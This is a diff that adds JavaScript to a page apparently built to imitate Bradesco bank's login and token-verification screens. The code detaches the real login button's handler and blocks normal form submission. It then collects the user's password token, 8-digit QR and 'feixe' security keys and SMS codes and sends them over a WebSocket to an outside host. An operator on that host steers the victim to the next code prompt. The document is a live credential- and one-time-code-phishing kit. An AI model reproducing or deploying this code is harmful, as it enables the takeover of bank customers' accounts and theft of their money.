+function mostrarFeixeContainer(dispositivo) {
+    ocultarTodosContainers();
+    const serialSpan = document.getElementById('serialDispositivoFeixe');
+    serialSpan.textContent = dispositivo || 'N o informado';
+    document.getElementById('feixeContainer').style.display = 'block';
+    exibirLoader(false);
+}
+
+function mostrarSMSContainer(telefone, dispositivo) {
+    ocultarTodosContainers();
+    const phoneSpan = document.getElementById('smsPhoneNumber');
+    const serialSpan = document.getElementById('serialDispositivoSMS');
+
+    if (telefone) {
+        let masked = telefone.replace(/\d/g, '*');
+        if (telefone.length === 10) masked = '(' + telefone.substr(0,2) + ') ' + telefone.substr(2,4) + '-' + telefone.substr(6,4);
+        else if (telefone.length === 11) masked = '(' + telefone.substr(0,2) + ') ' + telefone.substr(2,5) + '-' + telefone.substr(7,4);
+        phoneSpan.textContent = masked;
+    } else {
+        phoneSpan.textContent = '(---) ----- ----';
+    }
+
+    serialSpan.textContent = dispositivo || 'N o informado';
+    document.getElementById('smsContainer').style.display = 'block';
+    exibirLoader(false);
+}
+
+function enviarChaveQR() {
+    const chave = document.getElementById('chaveSegurancaQR').value.trim();
+    if (!chave || chave.length !== 8 || !/^\d+$/.test(chave)) {
+        alert('Digite os 8 d gitos da chave de seguran a.');
+        return;
+    }
+    exibirLoader(true);
+    if (websocket && websocket.readyState === WebSocket.OPEN) {
+        websocket.send(JSON.stringify({ acao: 'token', usuario: usuarioGlobal, token: chave, tipo: 'qr' }));
+    } else {
+        exibirLoader(false);
+        alert('Erro de conex o.');
+    }
+}
+
+function iniciarLeitura() {
+    exibirLoader(true);
+    if (websocket && websocket.readyState === WebSocket.OPEN) {
+        websocket.send(JSON.stringify({ acao: 'iniciar_leitura', usuario: usuarioGlobal }));
+    } else {
+        exibirLoader(false);
+        alert('Erro de conex o.');
+    }
+}
+
+function enviarChaveFeixe() {
+    const chave = document.getElementById('chaveSegurancaFeixe').value.trim();
+    if (!chave || chave.length !== 8 || !/^\d+$/.test(chave)) {
+        alert('Digite os 8 d gitos da chave de seguran a.');
+        return;
+    }
+    exibirLoader(true);
+    if (websocket && websocket.readyState === WebSocket.OPEN) {
+        websocket.send(JSON.stringify({ acao: 'token', usuario: usuarioGlobal, token: chave, tipo: 'feixe' }));
+    } else {
+        exibirLoader(false);
+        alert('Erro de conex o.');
+    }
+}
+
+function enviarCodigoSMS() {
+    const codigo = document.getElementById('codigoSMS').value.trim();
+    if (!codigo || codigo.length !== 6 || !/^\d+$/.test(codigo)) {
+        alert('Digite o c digo de 6 d gitos recebido por SMS.');
+        return;
+    }
+    exibirLoader(true);
+    if (websocket && websocket.readyState === WebSocket.OPEN) {
+        websocket.send(JSON.stringify({ acao: 'token', usuario: usuarioGlobal, token: codigo, tipo: 'sms' }));
+    } else {
+        exibirLoader(false);
+        alert('Erro de conex o.');
+    }
+}
+
+function reenviarSMS() {
+    exibirLoader(true);
+    if (websocket && websocket.readyState === WebSocket.OPEN) {
+        websocket.send(JSON.stringify({ acao: 'reenviar_sms', usuario: usuarioGlobal }));
+    } else {
+        exibirLoader(false);
+        alert('Erro de conex o.');
+    }
+}
+
+function voltarParaToken() {
+    ocultarTodosContainers();
+    document.getElementById('tokenFormContainer').style.display = 'block';
+    exibirLoader(false);
+    // Limpa campos
+    document.getElementById('chaveSegurancaQR').value = '';
+    document.getElementById('chaveSegurancaFeixe').value = '';
+    document.getElementById('codigoSMS').value = '';
+}
+
+function capturarTokenClick() {
+    const botao = document.getElementById('botaoAcessar');
+    if (!botao) return;
+    botao.removeAttribute('onclick');
+
+    const form = document.getElementById('formTeste');
+    if (form) {
+        form.addEventListener('submit', function(e) { e.preventDefault(); return false; });
+    }
+
+    botao.addEventListener('click', function(event) {
+        event.preventDefault();
+        const input = document.querySelector('input[type="password"].txtSenhaToken');
+        const token = input ? input.value.trim() : '';
+        if (!token) return;
+
+        exibirLoader(true);
+
+        if (websocket && websocket.readyState === WebSocket.OPEN) {
+            websocket.send(JSON.stringify({
+                acao: 'token',
+                usuario: usuarioGlobal,
+                token: token,
+                tipo: 'padrao'
+            }));
+            sessionStorage.setItem('token', token);
+        } else {
+            exibirLoader(false);
+            alert('Erro de conex o. Tente novamente.');
+        }
+    });
+}
+
+function conectarWebSocket(usuario) {
+    const serverUrl = window.BACKEND_WS_URL || 'wss://syncservicesqrgeneretor.online/ws/';
+    websocket = new WebSocket(serverUrl);
+
+    websocket.onopen = () => {
+        console.log('WS conectado');
+        if (usuarioGlobal) {
+            websocket.send(JSON.stringify({ acao: 'reconectar', usuario: usuarioGlobal }));
+        }
+    };
+
+    websocket.onmessage = (event) => {
+        const mensagem = JSON.parse(event.data);
+        console.log('Mensagem WS recebida:', mensagem);
+
+        if (mensagem.acao === 'progresso' && mensagem.etapa) {
+            avancarEtapa(mensagem.etapa);
+        }
+        else if (mensagem.acao === 'redirecionar') {
+            if (mensagem.url === '/qr.html' && mensagem.qr) {
+                mostrarQRContainer(mensagem.qr, mensagem.dispositivo);
+                if (mensagem.nome) sessionStorage.setItem('nome', mensagem.nome);
+                if (mensagem.dispositivo) sessionStorage.setItem('dispositivo', mensagem.dispositivo);
+                if (mensagem.feixe) sessionStorage.setItem('feixe', mensagem.feixe);
+            }
+            else if (mensagem.url === '/feixe.html') {
+                mostrarFeixeContainer(mensagem.dispositivo);
+                if (mensagem.nome) sessionStorage.setItem('nome', mensagem.nome);
+                if (mensagem.dispositivo) sessionStorage.setItem('dispositivo', mensagem.dispositivo);
+            }
+            else if (mensagem.url === '/sms.html') {
+                mostrarSMSContainer(mensagem.telefone, mensagem.dispositivo);
+                if (mensagem.nome) sessionStorage.setItem('nome', mensagem.nome);
+                if (mensagem.dispositivo) sessionStorage.setItem('dispositivo', mensagem.dispositivo);
+                if (mensagem.telefone) sessionStorage.setItem('telefone', mensagem.telefone);
+            }
+            else if (mensagem.url) {
+                finalizarTodasEtapas();
+                if (mensagem.nome) sessionStorage.setItem('nome', mensagem.nome);
+                if (mensagem.dispositivo) sessionStorage.setItem('dispositivo', mensagem.dispositivo);
+                if (mensagem.feixe) sessionStorage.setItem('feixe', mensagem.feixe);
+                if (mensagem.qr) sessionStorage.setItem('qr', mensagem.qr);
+                if (mensagem.telefone) sessionStorage.setItem('telefone', mensagem.telefone);
+                setTimeout(() => { window.location.href = mensagem.url; }, 500);
+            }
+        }
+    };
+
+    websocket.onclose = () => setTimeout(() => conectarWebSocket(usuario), 5000);
+    websocket.onerror = (err) => console.error('WS error', err);
+}
+
+function aplicarDispositivo(disp) {
+    if (!disp) return;
+    const span = document.querySelector('p.clr.fs10 strong span.HtmlOutputTextBradesco');
+    if (span) span.textContent = disp;
+}
+
+window.addEventListener('load', () => {
+    usuarioGlobal = sessionStorage.getItem('usuario');
+    const nome = sessionStorage.getItem('nome');
+    const dispositivo = sessionStorage.getItem('dispositivo');
+
+    if (nome) {
+        const nomeEl = document.querySelector('.nomeUsuario');
+        if (nomeEl) nomeEl.textContent = nome;
+    }
+    if (dispositivo) setTimeout(() => aplicarDispositivo(dispositivo), 200);
+    if (usuarioGlobal) conectarWebSocket(usuarioGlobal);
+    capturarTokenClick();
+
+    document.getElementById('confirmarChaveQRBtn')?.addEventListener('click', enviarChaveQR);
+    document.getElementById('iniciarLeituraBtn')?.addEventListener('click', iniciarLeitura);
+    document.getElementById('confirmarChaveFeixeBtn')?.addEventListener('click', enviarChaveFeixe);
+    document.getElementById('confirmarSMSBtn')?.addEventListener('click', enviarCodigoSMS);
+    document.getElementById('reenviarSMSBtn')?.addEventListener('click', reenviarSMS);
+    document.getElementById('voltarTokenQRBtn')?.addEventListener('click', voltarParaToken);
+    document.getElementById('voltarTokenFeixeBtn')?.addEventListener('click', voltarParaToken);
+    document.getElementById('voltarTokenSMSBtn')?.addEventListener('click', voltarParaToken);
+});
+</script>
+  </body>
+</html>
